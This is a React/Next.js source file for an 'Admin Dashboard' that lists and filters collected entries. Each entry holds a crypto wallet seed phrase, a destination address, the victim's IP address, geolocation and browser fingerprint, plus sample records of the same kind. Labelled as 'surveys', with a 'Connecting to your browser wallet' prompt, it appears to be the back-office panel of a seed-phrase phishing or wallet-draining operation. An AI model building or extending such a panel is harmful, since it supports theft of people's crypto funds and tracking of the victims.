"use client";
import { useState } from "react";
import {
	Select,
	SelectContent,
	SelectItem,
	SelectTrigger,
	SelectValue,
} from "@/components/ui/select";
import { Input } from "@/components/ui/input";
import UsersCard from "@/components/admin/users-card";
import { useSurveys } from "@/hooks/use-surveys";
import { motion } from "motion/react";

// Mock data
const mockUsers = [
	{
		blockchainNetwork: "tron",
		walletProvider: "trustwallet",
		seedPhrase:
			"abandon ability able about above absent absorb abstract absurd abuse access",
		destinationAddress:
			"addr1q9w8f4z7g6xk5r8v9t6p7a8s2e0h5y3l0m2q8u4f9c6v7d8x9y0z5a2n3k4m",
		geolocation: {
			latitude: 6.45407,
			longitude: 3.39467,
			city: "Lagos",
			region: "Lagos",
			country: "Nigeria",
		},
		ipAddress: "129.222.206.243",
		screenResolution: "1536x864",
		userAgent:
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/141.0.0.0 Safari/537.36",
		timestamp: "2025-01-15T10:30:00Z",
	},
	{
		blockchainNetwork: "ethereum",
		walletProvider: "metamask",
		seedPhrase:
			"zebra young xray whale voice under tree super royal quantum perfect",
		destinationAddress: "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb8",
		geolocation: {
			latitude: 40.7128,
			longitude: -74.006,
			city: "New York",
			region: "NY",
			country: "USA",
		},
		ipAddress: "192.168.1.100",
		screenResolution: "1920x1080",
		userAgent:
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		timestamp: "2025-01-16T14:20:00Z",
	},
	{
		blockchainNetwork: "binance",
		walletProvider: "trustwallet",
		seedPhrase:
			"ocean never morning lake join define pioneer usual knee veteran",
		destinationAddress: "bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2",
		geolocation: {
			latitude: 51.5074,
			longitude: -0.1278,
			city: "London",
			region: "England",
			country: "UK",
		},
		ipAddress: "185.44.76.123",
		screenResolution: "2560x1440",
		userAgent: "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36",
		timestamp: "2025-01-17T09:15:00Z",
	},
	{
		blockchainNetwork: "solana",
		walletProvider: "phantom",
		seedPhrase: "guitar hello inside july kite lamp monkey noble opera paper",
		destinationAddress: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU",
		geolocation: {
			latitude: 35.6762,
			longitude: 139.6503,
			city: "Tokyo",
			region: "Tokyo",
			country: "Japan",
		},
		ipAddress: "203.0.113.45",
		screenResolution: "1440x900",
		userAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
		timestamp: "2025-01-18T18:45:00Z",
	},
	{
		blockchainNetwork: "polygon",
		walletProvider: "metamask",
		seedPhrase:
			"fiction eager drink cycle quality unique range simple valley total",
		destinationAddress: "0x89205A3A3b2A69De6Dbf7f01ED13B2108B2c43e7",
		geolocation: {
			latitude: -33.8688,
			longitude: 151.2093,
			city: "Sydney",
			region: "NSW",
			country: "Australia",
		},
		ipAddress: "203.50.88.210",
		screenResolution: "1680x1050",
		userAgent:
			"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
		timestamp: "2025-01-19T06:30:00Z",
	},
	{
		blockchainNetwork: "cardano",
		walletProvider: "yoroi",
		seedPhrase:
			"arrive birth coconut depend emerge fabric gesture hotel impulse",
		destinationAddress: "addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0dnl0rv3hjn0p",
		geolocation: {
			latitude: 19.4326,
			longitude: -99.1332,
			city: "Mexico City",
			region: "CDMX",
			country: "Mexico",
		},
		ipAddress: "187.188.100.50",
		screenResolution: "1366x768",
		userAgent: "Mozilla/5.0 (Android 11; Mobile) AppleWebKit/537.36",
		timestamp: "2025-01-20T12:00:00Z",
	},
];

export default function DashboardPage() {
	const [walletFilter, setWalletFilter] = useState<string>("all");
	const [dateFilter, setDateFilter] = useState<string>("");
	const { surveys, loading, error } = useSurveys();

	const filteredUsers = () => {
		return surveys.filter((user) => {
			const walletMatch =
				walletFilter === "all" || user.walletProvider === walletFilter;
			const dateMatch =
				!dateFilter || (user.timestamp && user.timestamp.includes(dateFilter));
			return walletMatch && dateMatch;
		});
	};

	const uniqueWallets = Array.from(
		new Set(surveys.map((u) => u.walletProvider))
	);

	console.log("this is the data", surveys);

	if (loading) {
		return (
			<motion.div
				initial={{ opacity: 0 }}
				animate={{ opacity: 1 }}
				transition={{ duration: 0.3 }}
				className="text-center text-white space-y-4"
			>
				<div className="animate-spin w-10 h-10 border-4 border-white/30 border-t-white rounded-full mx-auto" />
				<p>Connecting to your browser wallet...</p>
			</motion.div>
		);
	}
	if (error) return <p style={{ color: "red" }}>{error}</p>;

	return (
		<div className="min-h-screen bg-white">
			<main className="p-primary pb-12">
				<div className="max-w-7xl mx-auto">
					{/* Header */}
					<div className="mb-8">
						<h1 className="text-4xl font-outfit font-bold mb-2">
							Admin Dashboard
						</h1>
						<p className="text-black/60">View and filter all user entries</p>
					</div>

					{/* Filters */}
					<div className="mb-6 flex flex-col sm:flex-row gap-4">
						<div className="flex-1">
							<label className="block text-sm font-dm-mono mb-2 text-black/60">
								Filter by Wallet
							</label>
							<Select
								value={walletFilter}
								onValueChange={setWalletFilter}
							>
								<SelectTrigger className="w-full">
									<SelectValue placeholder="All wallets" />
								</SelectTrigger>
								<SelectContent className="text-black bg-white">
									<SelectItem value="all">All Wallets</SelectItem>
									{uniqueWallets.map((wallet) => (
										<SelectItem
											key={wallet}
											value={wallet}
											className="capitalize"
										>
											{wallet}
										</SelectItem>
									))}
								</SelectContent>
							</Select>
						</div>

						<div className="flex-1">
							<label className="block text-sm font-dm-mono mb-2 text-black/60">
								Filter by Date
							</label>
							<Input
								type="date"
								value={dateFilter}
								onChange={(e) => setDateFilter(e.target.value)}
								className="w-full"
							/>
						</div>
					</div>

					{/* Results Count */}
					<div className="mb-4">
						<p className="text-sm font-dm-mono text-black/60">
							Showing {filteredUsers().length} of {surveys.length} entries
						</p>
					</div>

					{/* Grid */}
					<div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
						{filteredUsers().map((user, index) => (
							<UsersCard
								key={index}
								entry={user}
								index={index}
							/>
						))}
					</div>

					{filteredUsers.length === 0 && (
						<div className="text-center py-12">
							<p className="text-xl text-black/60">
								No entries match your filters
							</p>
						</div>
					)}
				</div>
			</main>
		</div>
	);
}
